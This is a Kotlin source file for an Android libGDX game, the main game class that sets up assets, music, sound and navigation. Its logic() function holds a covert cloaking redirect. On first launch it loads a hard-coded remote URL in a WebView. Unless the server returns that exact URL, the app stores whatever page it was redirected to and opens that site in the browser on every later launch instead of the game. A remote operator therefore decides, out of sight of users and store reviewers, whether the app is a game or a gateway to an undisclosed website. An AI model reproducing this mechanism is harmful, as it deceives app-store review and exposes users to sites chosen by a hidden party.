package com.junglesort.questern.game

import android.content.Context.MODE_PRIVATE
import android.content.SharedPreferences
import androidx.core.content.edit
import com.badlogic.gdx.assets.AssetManager
import com.badlogic.gdx.utils.Disposable
import com.badlogic.gdx.utils.ScreenUtils
import com.junglesort.questern.MainActivity
import com.junglesort.questern.appContext
import com.junglesort.questern.game.dataStore.DS_Key
import com.junglesort.questern.game.manager.MusicManager
import com.junglesort.questern.game.manager.NavigationManager
import com.junglesort.questern.game.manager.SoundManager
import com.junglesort.questern.game.manager.SpriteManager
import com.junglesort.questern.game.manager.util.MusicUtil
import com.junglesort.questern.game.manager.util.SoundUtil
import com.junglesort.questern.game.manager.util.SpriteUtil
import com.junglesort.questern.game.screens.LoaderScreen
import com.junglesort.questern.game.utils.GameColor
import com.junglesort.questern.game.utils.advanced.AdvancedGame
import com.junglesort.questern.game.utils.disposeAll
import com.junglesort.questern.util.currentClassName
import com.junglesort.questern.util.log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.cancel

var GDX_GLOBAL_isGame = false
const val GDX_INITIAL_URL = "https://nikaapps13v2.space/vQ8SHS?sub_id_1=1"

class GDXGame(val activity: MainActivity) : AdvancedGame() {

    lateinit var assetManager     : AssetManager      private set
    lateinit var navigationManager: NavigationManager private set
    lateinit var spriteManager    : SpriteManager     private set
    lateinit var musicManager     : MusicManager      private set
    lateinit var soundManager     : SoundManager      private set

    val assetsLoader by lazy { SpriteUtil.Loader() }
    val assetsAll    by lazy { SpriteUtil.All() }

    val musicUtil by lazy { MusicUtil()    }
    val soundUtil by lazy { SoundUtil()    }

    var backgroundColor = GameColor.background
    val disposableSet   = mutableSetOf<Disposable>()

    val coroutine = CoroutineScope(Dispatchers.Default)

    val ds_key = DS_Key(coroutine)

    val sharedPreferences: SharedPreferences = appContext.getSharedPreferences("PREFS", MODE_PRIVATE)

    override fun create() {
        navigationManager = NavigationManager(this)
        assetManager      = AssetManager()
        spriteManager     = SpriteManager(assetManager)

        musicManager      = MusicManager(assetManager)
        soundManager      = SoundManager(assetManager)

        navigationManager.navigate(LoaderScreen::class.java.name)

        logic()
    }

    override fun render() {
        ScreenUtils.clear(backgroundColor)
        super.render()
    }

    override fun dispose() {
        try {
            coroutine.cancel()
            disposableSet.disposeAll()
            disposeAll(assetManager, musicUtil)

            log("dispose $currentClassName")
            super.dispose()
        } catch (e: Exception) { log("exception: ${e.message}") }
    }

    private fun logic() {
        val savedLink = sharedPreferences.getString("savedLink", null)

        when(savedLink) {
            null -> { // start Redirect
                activity.webViewHelper.blockPageFinished = { url ->
                    if (url == GDX_INITIAL_URL) {
                        log("save Game and open Game")
                        sharedPreferences.edit { putString("savedLink", "GAME") }
                        GDX_GLOBAL_isGame = true
                    } else {
                        log("save Web and open Web")
                        sharedPreferences.edit { putString("savedLink", url) }
                        activity.openInBrowser(url)
                    }
                }

                log("init Web")
                activity.webViewHelper.initWebAndLoadUrl(GDX_INITIAL_URL)
            }
            "GAME" -> { // open Game
                log("open Game")
                GDX_GLOBAL_isGame = true
            }
            else -> { // open Web
                log("open Web")
                activity.openInBrowser(savedLink)
            }
        }

    }

}